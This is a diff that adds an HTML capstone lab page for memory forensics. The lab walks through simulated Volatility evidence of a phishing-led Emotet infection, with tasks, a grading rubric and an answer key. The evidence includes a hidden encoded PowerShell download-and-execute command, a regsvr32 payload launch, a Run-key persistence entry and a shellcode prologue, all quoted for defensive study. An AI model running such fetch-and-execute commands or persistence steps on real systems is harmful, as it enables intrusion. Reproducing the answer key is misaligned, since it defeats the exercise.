@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('sorted');</script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DF-30: Memory Analysis Capstone | Forensics Hub</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg-dark: #090910; --bg-card: #111120; --bg-terminal: #0d1117;
+            --accent: #f472b6; --accent-dim: rgba(244,114,182,0.12); --accent-border: rgba(244,114,182,0.25);
+            --green: #4ade80; --yellow: #fbbf24; --red: #f87171;
+            --text-primary: #e2e8f0; --text-secondary: #8b949e; --border: rgba(255,255,255,0.08);
+        }
+        body { font-family: 'Inter', system-ui, sans-serif; background: var(--bg-dark); color: var(--text-primary); line-height: 1.6; }
+        .fh-header { background: var(--bg-card); border-bottom: 1px solid var(--border); padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
+        .fh-header-left { display: flex; align-items: center; gap: 14px; }
+        .fh-badge { background: var(--accent); color: #fff; padding: 4px 10px; border-radius: 4px; font-size: 0.72rem; font-weight: 700; font-family: 'JetBrains Mono', monospace; letter-spacing: 0.5px; }
+        .fh-header h1 { font-size: 1.05rem; font-weight: 600; color: var(--accent); }
+        .fh-back { color: var(--text-secondary); padding: 6px 14px; border: 1px solid var(--border); border-radius: 6px; font-size: 0.85rem; transition: all 0.2s; text-decoration: none; }
+        .fh-back:hover { background: var(--accent); color: #fff; border-color: var(--accent); }
+        .fh-breadcrumb { padding: 9px 24px; font-size: 12px; color: var(--text-secondary); background: rgba(9,9,16,0.6); border-bottom: 1px solid rgba(255,255,255,0.04); }
+        .fh-breadcrumb a { color: var(--accent); text-decoration: none; }
+        .fh-breadcrumb a:hover { opacity: 0.8; }
+        .fh-breadcrumb-sep { margin: 0 7px; color: #333; }
+        .content-panel { max-width: 820px; margin: 0 auto; padding: 30px 32px 60px; }
+        .section { margin-bottom: 36px; }
+        .section-title { font-size: 1.25rem; color: var(--accent); margin-bottom: 14px; display: flex; align-items: center; gap: 10px; }
+        .section-title::before { content: ''; width: 3px; height: 20px; background: var(--accent); border-radius: 2px; flex-shrink: 0; }
+        .objectives { background: var(--accent-dim); border-left: 3px solid var(--accent); padding: 16px 20px; border-radius: 0 8px 8px 0; margin-bottom: 28px; }
+        .objectives h2 { color: var(--accent); margin-bottom: 10px; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px; }
+        .objectives ul { list-style: none; }
+        .objectives li { padding: 4px 0 4px 20px; position: relative; color: var(--text-secondary); font-size: 0.9rem; }
+        .objectives li::before { content: '>'; position: absolute; left: 0; color: var(--accent); font-family: 'JetBrains Mono', monospace; }
+        .content-text { color: var(--text-secondary); margin-bottom: 14px; font-size: 0.95rem; line-height: 1.7; }
+        .feature-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 14px 0; }
+        .feature-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: 14px; }
+        .feature-card strong { color: var(--accent); display: block; margin-bottom: 4px; font-size: 0.88rem; }
+        .feature-card span { color: var(--text-secondary); font-size: 0.84rem; line-height: 1.5; }
+        .code-block { background: var(--bg-terminal); border: 1px solid var(--border); border-radius: 8px; padding: 16px; margin: 14px 0; overflow-x: auto; }
+        .code-block-header { font-size: 0.72rem; color: var(--text-secondary); margin-bottom: 10px; font-family: 'JetBrains Mono', monospace; text-transform: uppercase; letter-spacing: 0.08em; display: flex; align-items: center; gap: 8px; }
+        .code-block-header::before { content: ''; width: 6px; height: 6px; border-radius: 50%; background: var(--accent); flex-shrink: 0; }
+        .code-block pre { font-family: 'JetBrains Mono', monospace; font-size: 0.83rem; line-height: 1.75; color: var(--text-primary); }
+        .cm { color: #6a737d; } .num { color: #79c0ff; } .out { color: var(--green); } .hl { color: var(--yellow); }
+        .callout { border-radius: 8px; padding: 16px 20px; margin: 20px 0; }
+        .callout--info { background: var(--accent-dim); border: 1px solid var(--accent-border); }
+        .callout--warn { background: rgba(251,191,36,0.08); border: 1px solid rgba(251,191,36,0.25); }
+        .callout--danger { background: rgba(248,113,113,0.08); border: 1px solid rgba(248,113,113,0.25); }
+        .callout h4 { font-size: 0.85rem; font-weight: 700; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .callout--info h4 { color: var(--accent); } .callout--warn h4 { color: var(--yellow); } .callout--danger h4 { color: var(--red); }
+        .callout p, .callout li { font-size: 0.88rem; color: var(--text-secondary); line-height: 1.6; }
+        .callout ul { list-style: none; }
+        .callout ul li { padding-left: 16px; position: relative; margin-bottom: 4px; }
+        .callout ul li::before { content: '-'; position: absolute; left: 0; color: var(--accent); }
+        .evidence-table { width: 100%; border-collapse: collapse; margin: 14px 0; font-size: 0.87rem; }
+        .evidence-table th { background: rgba(244,114,182,0.08); color: var(--accent); font-weight: 600; text-align: left; padding: 10px 14px; border-bottom: 2px solid rgba(244,114,182,0.2); font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.5px; }
+        .evidence-table td { padding: 10px 14px; border-bottom: 1px solid var(--border); color: var(--text-secondary); vertical-align: top; }
+        .evidence-table tr:hover td { background: rgba(244,114,182,0.04); }
+        .inline-code { background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px; font-family: 'JetBrains Mono', monospace; font-size: 0.83em; color: var(--accent); }
+        .try-it { background: rgba(74,222,128,0.06); border: 1px solid rgba(74,222,128,0.2); border-radius: 8px; padding: 18px 20px; margin: 20px 0; }
+        .try-it h3 { color: var(--green); margin-bottom: 10px; font-size: 0.95rem; }
+        .try-it p, .try-it li { color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 6px; }
+        .try-it ol, .try-it ul { padding-left: 20px; }
+        .rubric { background: var(--bg-card); border: 1px solid var(--accent-border); border-radius: 8px; padding: 20px; margin: 20px 0; }
+        .rubric h3 { color: var(--accent); margin-bottom: 12px; }
+        .takeaways { background: linear-gradient(135deg, rgba(244,114,182,0.08), rgba(244,114,182,0.04)); border: 1px solid var(--accent); border-radius: 8px; padding: 20px; margin: 25px 0; }
+        .takeaways h3 { color: var(--accent); margin-bottom: 12px; font-size: 1rem; }
+        .takeaways ul { list-style: none; }
+        .takeaways li { padding: 5px 0 5px 24px; position: relative; color: var(--text-secondary); font-size: 0.9rem; }
+        .takeaways li::before { content: '\2713'; position: absolute; left: 0; color: var(--green); font-weight: bold; }
+        .nav-footer { display: flex; justify-content: space-between; padding: 16px 0; margin-top: 30px; border-top: 1px solid var(--border); }
+        .nav-btn { display: flex; align-items: center; gap: 8px; padding: 10px 16px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; color: var(--text-primary); text-decoration: none; font-size: 0.9rem; transition: all 0.2s; }
+        .nav-btn:hover { border-color: var(--accent); background: var(--accent-dim); }
+        .nav-btn.primary { background: var(--accent); color: #fff; border-color: var(--accent); }
+        .nav-btn.primary:hover { filter: brightness(1.1); }
+        @media (max-width: 700px) { .content-panel { padding: 20px 16px 40px; } .feature-grid { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+    <header class="fh-header">
+        <div class="fh-header-left">
+            <span class="fh-badge">DF-30</span>
+            <h1>Memory Analysis Capstone</h1>
+        </div>
+        <a href="../../index.html" class="fh-back">&lt; Forensics Hub</a>
+    </header>
+    <nav class="fh-breadcrumb" aria-label="Breadcrumb">
+        <a href="/dashboard.html">Dashboard</a>
+        <span class="fh-breadcrumb-sep">/</span>
+        <a href="../../index.html">Forensics Hub</a>
+        <span class="fh-breadcrumb-sep">/</span>
+        <a href="../../index.html">Memory Forensics</a>
+        <span class="fh-breadcrumb-sep">/</span>
+        DF-30: Memory Analysis Capstone
+    </nav>
+
+    <div class="content-panel">
+        <div class="objectives">
+            <h2>Capstone Objectives</h2>
+            <ul>
+                <li>Analyze Volatility output to identify a complete malware infection chain</li>
+                <li>Detect process injection and code hiding techniques</li>
+                <li>Map command-and-control communications to threat actor infrastructure</li>
+                <li>Reconstruct the full attack timeline from memory artifacts</li>
+                <li>Write a professional investigation report with IOCs and recommendations</li>
+            </ul>
+        </div>
+
+        <section class="section">
+            <h2 class="section-title">Scenario: Corporate Workstation Compromise</h2>
+            <p class="content-text">You are a forensic analyst for Meridian Financial Services. At 09:15 EST on Tuesday, the SOC received alerts from both the EDR platform and the network IDS for workstation FINOPS-PC-17, assigned to an accounts payable clerk. The EDR flagged "suspicious PowerShell execution" and the IDS triggered on "Possible Emotet C2 Communication."</p>
+            <p class="content-text">The incident commander authorized live memory acquisition at 09:28 EST. You now have a 16 GB memory dump and need to determine: what happened, when it happened, and how far the compromise extends.</p>
+
+            <div class="callout callout--danger">
+                <h4>Scenario Context</h4>
+                <ul>
+                    <li>Workstation: FINOPS-PC-17, Windows 10 22H2 x64</li>
+                    <li>User: aparker (Accounts Payable, standard user)</li>
+                    <li>EDR Alert: "Suspicious PowerShell - encoded command execution" at 09:02 EST</li>
+                    <li>IDS Alert: "ET MALWARE Win32/Emotet CnC Activity (POST)" at 09:08 EST</li>
+                    <li>Additional IDS Alert: "ET POLICY SMB2 NT Create AndX Request For a DLL" at 09:12 EST</li>
+                    <li>Memory acquired: 09:28 EST using DumpIt</li>
+                </ul>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Evidence Set A: Process Analysis</h2>
+            <p class="content-text">Analyze the following Volatility output and answer the questions below.</p>
+
+            <div class="code-block">
+                <div class="code-block-header">pstree output (excerpt)</div>
+                <pre>PID   PPID  Name                    Create Time (EST)
+4     0     System                  2024-03-19 07:55:01
+88    4     Registry                2024-03-19 07:55:01
+560   4     smss.exe                2024-03-19 07:55:08
+...
+712   560   services.exe            2024-03-19 07:55:30
+784   560   lsass.exe               2024-03-19 07:55:31
+1204  712   svchost.exe             2024-03-19 07:55:45
+1320  712   svchost.exe             2024-03-19 07:55:48
+3616  1320  sihost.exe              2024-03-19 08:02:10
+4120  3616  explorer.exe            2024-03-19 08:02:22
+5340  4120  outlook.exe             2024-03-19 08:15:44
+<span class="hl">5812  5340  WINWORD.EXE             2024-03-19 08:58:33</span>
+<span class="hl">6044  5812  cmd.exe                 2024-03-19 08:58:41</span>
+<span class="hl">6108  6044  powershell.exe          2024-03-19 08:58:42</span>
+<span class="hl">6240  6108  regsvr32.exe            2024-03-19 09:00:15</span>
+<span class="hl">6388  6240  cmd.exe                 2024-03-19 09:02:30</span>
+<span class="hl">6420  6388  systeminfo.exe          2024-03-19 09:02:31</span>
+<span class="hl">6456  6388  nltest.exe              2024-03-19 09:02:35</span>
+<span class="hl">6490  6388  net.exe                 2024-03-19 09:02:38</span>
+1456  712   spoolsv.exe             2024-03-19 07:56:02
+2100  712   svchost.exe             2024-03-19 07:56:15</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="code-block-header">cmdline output (suspicious processes)</div>
+                <pre>5812  WINWORD.EXE  "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
+      /n "C:\Users\aparker\AppData\Local\Temp\Invoice_March_2024.docm"
+
+6044  cmd.exe  cmd.exe /c powershell -nop -w hidden -enc
+      SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABp
+      AGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAA
+      ...
+
+6108  powershell.exe  powershell -nop -w hidden -enc [base64 data]
+
+6240  regsvr32.exe  regsvr32.exe /s C:\Users\aparker\AppData\Local\Temp\update.dll
+
+6388  cmd.exe  cmd.exe /c "systeminfo && nltest /dclist: && net group
+      \"Domain Admins\" /domain"</pre>
+            </div>
+
+            <div class="try-it">
+                <h3>Task 1: Process Analysis Questions</h3>
+                <ol>
+                    <li>What was the initial attack vector? Cite specific evidence.</li>
+                    <li>Trace the full process chain from initial compromise to reconnaissance. What is the parent-child relationship?</li>
+                    <li>What do the discovery commands (systeminfo, nltest, net group) tell you about the attacker's objectives?</li>
+                    <li>Why is the WINWORD.EXE -> cmd.exe -> powershell.exe chain suspicious?</li>
+                </ol>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Evidence Set B: Network Connections</h2>
+
+            <div class="code-block">
+                <div class="code-block-header">netscan output (excerpt)</div>
+                <pre>PID   Process        Local            Foreign              State
+1204  svchost.exe    0.0.0.0:135      0.0.0.0:0            LISTENING
+5340  outlook.exe    10.10.5.17:49200 52.96.166.130:443    ESTABLISHED
+<span class="hl">6240  regsvr32.exe   10.10.5.17:49301 91.121.87.18:8080    ESTABLISHED</span>
+<span class="hl">6240  regsvr32.exe   10.10.5.17:49305 185.148.169.22:443   ESTABLISHED</span>
+<span class="hl">6240  regsvr32.exe   10.10.5.17:49310 10.10.5.5:445        ESTABLISHED</span>
+<span class="hl">6240  regsvr32.exe   10.10.5.17:49312 10.10.5.6:445        ESTABLISHED</span>
+<span class="hl">6240  regsvr32.exe   10.10.5.17:49315 10.10.5.10:445       ESTABLISHED</span>
+2100  svchost.exe    0.0.0.0:5985     0.0.0.0:0            LISTENING</pre>
+            </div>
+
+            <div class="try-it">
+                <h3>Task 2: Network Analysis Questions</h3>
+                <ol>
+                    <li>How many external C2 servers is the malware communicating with? List the IPs and ports.</li>
+                    <li>What internal systems has the attacker targeted? What protocol?</li>
+                    <li>Why would Emotet use multiple C2 servers?</li>
+                    <li>What is the significance of port 8080 vs 443 for C2?</li>
+                    <li>What does the SMB (445) activity to three internal hosts suggest?</li>
+                </ol>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Evidence Set C: Injection Detection</h2>
+
+            <div class="code-block">
+                <div class="code-block-header">malfind output (PID 6240 - regsvr32.exe)</div>
+                <pre><span class="hl">Process: regsvr32.exe  PID: 6240  PPID: 6108</span>
+<span class="hl">VAD Tag: VadS  Protection: PAGE_EXECUTE_READWRITE</span>
+Start: 0x0000018040000000  End: 0x000001804007ffff
+0x18040000000  4d 5a 90 00 03 00 00 00  MZ......
+0x18040000008  04 00 00 00 ff ff 00 00  ........
+0x18040000010  b8 00 00 00 00 00 00 00  ........
+
+<span class="hl">VAD Tag: VadS  Protection: PAGE_EXECUTE_READWRITE</span>
+Start: 0x0000018050000000  End: 0x000001805001ffff
+0x18050000000  fc 48 83 e4 f0 e8 cc 00  .H......
+0x18050000008  00 00 41 51 41 50 52 51  ..AQAPRQ
+<span class="cm"># This is x64 shellcode (starts with CLD; SUB RSP pattern)</span></pre>
+            </div>
+
+            <div class="code-block">
+                <div class="code-block-header">ldrmodules output (PID 6240)</div>
+                <pre>PID   Process        Base          InLoad InInit InMem  Path
+6240  regsvr32.exe   0x7ff6c8a0000 True   True   True   \Windows\System32\regsvr32.exe
+6240  regsvr32.exe   0x7ffc1a70000 True   True   True   \Windows\System32\ntdll.dll
+6240  regsvr32.exe   0x7ffc1820000 True   True   True   \Windows\System32\kernel32.dll
+<span class="hl">6240  regsvr32.exe   0x18040000000 False  False  False  ---</span>
+<span class="cm"># Unlisted module at injected address -- not in any loader list</span></pre>
+            </div>
+
+            <div class="code-block">
+                <div class="code-block-header">yarascan output</div>
+                <pre><span class="hl">Rule: Emotet_Payload_v4</span>
+Owner: regsvr32.exe (6240)
+Address: 0x18040002100
+Match: "POST /wp-content/uploads/" (Emotet C2 URI pattern)
+
+<span class="hl">Rule: Shellcode_x64_Metasploit</span>
+Owner: regsvr32.exe (6240)
+Address: 0x18050000000
+Match: FC 48 83 E4 F0 (standard x64 shellcode prologue)</pre>
+            </div>
+
+            <div class="try-it">
+                <h3>Task 3: Injection Analysis Questions</h3>
+                <ol>
+                    <li>How many injected code regions were found in regsvr32.exe? Describe each.</li>
+                    <li>What does the ldrmodules "False False False" entry indicate?</li>
+                    <li>What malware family do the YARA rules identify?</li>
+                    <li>Why would the attacker use regsvr32.exe as the injection host?</li>
+                </ol>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Evidence Set D: Registry and Persistence</h2>
+
+            <div class="code-block">
+                <div class="code-block-header">printkey output -- Run keys</div>
+                <pre>$ vol -f FINOPS-PC-17.raw windows.registry.printkey
+  --key "Software\Microsoft\Windows\CurrentVersion\Run"
+
+<span class="out">Key: Software\Microsoft\Windows\CurrentVersion\Run</span>
+<span class="out">Last updated: 2024-03-19 09:01:22 EST</span>
+
+REG_SZ  SecurityHealth  "C:\Windows\System32\SecurityHealthSystray.exe"
+REG_SZ  OneDrive        "C:\Users\aparker\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
+<span class="hl">REG_SZ  WindowsUpdate   regsvr32.exe /s "C:\Users\aparker\AppData\Local\Temp\update.dll"</span></pre>
+            </div>
+
+            <div class="try-it">
+                <h3>Task 4: Persistence Questions</h3>
+                <ol>
+                    <li>What persistence mechanism did the attacker establish?</li>
+                    <li>When was the persistence created relative to the initial compromise?</li>
+                    <li>Why did the attacker name the registry value "WindowsUpdate"?</li>
+                    <li>What would happen on the next user login?</li>
+                </ol>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Capstone Deliverable: Investigation Report</h2>
+            <p class="content-text">Using all four evidence sets, write a complete investigation report. Your report must include the following sections:</p>
+
+            <div class="rubric">
+                <h3>Grading Rubric (100 points)</h3>
+                <table class="evidence-table">
+                    <thead>
+                        <tr>
+                            <th>Section</th>
+                            <th>Points</th>
+                            <th>Requirements</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong style="color:var(--accent)">Executive Summary</strong></td>
+                            <td>10</td>
+                            <td>2-3 paragraph summary accessible to non-technical management. Include impact assessment and business risk.</td>
+                        </tr>
+                        <tr>
+                            <td><strong style="color:var(--accent)">Attack Timeline</strong></td>
+                            <td>20</td>
+                            <td>Chronological reconstruction with timestamps, events, and evidence sources. Minimum 8 events from initial access to lateral movement.</td>
+                        </tr>
+                        <tr>
+                            <td><strong style="color:var(--accent)">Malware Analysis</strong></td>
+                            <td>20</td>
+                            <td>Identify the malware family, injection technique, persistence mechanism, and C2 infrastructure. Reference specific Volatility output.</td>
+                        </tr>
+                        <tr>
+                            <td><strong style="color:var(--accent)">Indicators of Compromise</strong></td>
+                            <td>15</td>
+                            <td>Complete IOC list: IP addresses, domains, file paths, registry keys, process names, YARA rule matches. Must be actionable for threat hunting.</td>
+                        </tr>
+                        <tr>
+                            <td><strong style="color:var(--accent)">Scope Assessment</strong></td>
+                            <td>15</td>
+                            <td>Identify all potentially compromised systems. Explain evidence for lateral movement. Assess credential exposure risk.</td>
+                        </tr>
+                        <tr>
+                            <td><strong style="color:var(--accent)">Recommendations</strong></td>
+                            <td>15</td>
+                            <td>Immediate containment actions, short-term remediation, and long-term hardening. Prioritized by urgency.</td>
+                        </tr>
+                        <tr>
+                            <td><strong style="color:var(--accent)">Professional Quality</strong></td>
+                            <td>5</td>
+                            <td>Clear writing, proper evidence references, logical flow, no speculation without evidence basis.</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Answer Key: Key Findings</h2>
+
+            <div class="callout callout--info">
+                <h4>Attack Chain Summary</h4>
+                <ul>
+                    <li>Initial Access: Malicious Word document ("Invoice_March_2024.docm") opened from Outlook attachment at 08:58</li>
+                    <li>Execution: Macro launched cmd.exe -> PowerShell with encoded download cradle at 08:58</li>
+                    <li>Payload: PowerShell downloaded update.dll (Emotet) and executed via regsvr32.exe at 09:00</li>
+                    <li>Persistence: Run key "WindowsUpdate" created at 09:01 to survive reboot</li>
+                    <li>C2: Emotet beacon established to 91.121.87.18:8080 and 185.148.169.22:443</li>
+                    <li>Discovery: systeminfo, nltest, net group "Domain Admins" at 09:02 -- attacker is targeting domain admin access</li>
+                    <li>Lateral Movement: SMB connections to 10.10.5.5, 10.10.5.6, and 10.10.5.10 starting at ~09:10</li>
+                    <li>MITRE Mapping: T1566.001 (Phishing), T1059.001 (PowerShell), T1218.010 (regsvr32), T1547.001 (Registry Run Key), T1082/T1016/T1069 (Discovery), T1021.002 (SMB Lateral Movement)</li>
+                </ul>
+            </div>
+
+            <div class="callout callout--danger">
+                <h4>Critical IOCs</h4>
+                <ul>
+                    <li>91.121.87.18:8080 -- Emotet C2 server</li>
+                    <li>185.148.169.22:443 -- Emotet C2 server (backup)</li>
+                    <li>C:\Users\aparker\AppData\Local\Temp\update.dll -- Emotet payload</li>
+                    <li>C:\Users\aparker\AppData\Local\Temp\Invoice_March_2024.docm -- initial lure document</li>
+                    <li>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate -- persistence</li>
+                    <li>YARA: Emotet_Payload_v4, Shellcode_x64_Metasploit</li>
+                    <li>Lateral targets: 10.10.5.5, 10.10.5.6, 10.10.5.10 (all SMB 445)</li>
+                </ul>
+            </div>
+        </section>
+
+        <div class="takeaways">
+            <h3>Key Takeaways</h3>
+            <ul>
+                <li>Real investigations require correlating multiple evidence sources -- no single plugin tells the whole story</li>
+                <li>The process tree reveals the full attack chain from phishing to lateral movement</li>
+                <li>malfind and ldrmodules together confirm code injection definitively</li>
+                <li>Registry analysis reveals persistence that would survive containment without remediation</li>
+                <li>The investigation report is the primary deliverable -- technical skills without communication skills are incomplete</li>
+                <li>MITRE ATT&CK mapping standardizes findings for cross-team communication</li>
+            </ul>
+        </div>
+
+        <div class="nav-footer">
+            <a href="df-29-workflow-lab.module.html" class="nav-btn">&larr; Prev: Workflow Simulation</a>
+            <a href="../../index.html" class="nav-btn primary">Back to Forensics Hub &rarr;</a>
+        </div>
+    </div>
+
+    <script>
+        if (typeof ModuleProgress !== 'undefined') {
+            ModuleProgress.init({ moduleId: 'df-30', hubKey: 'hexworth_forensics_progress' });
+        }
+    </script>
+</body>
+</html>
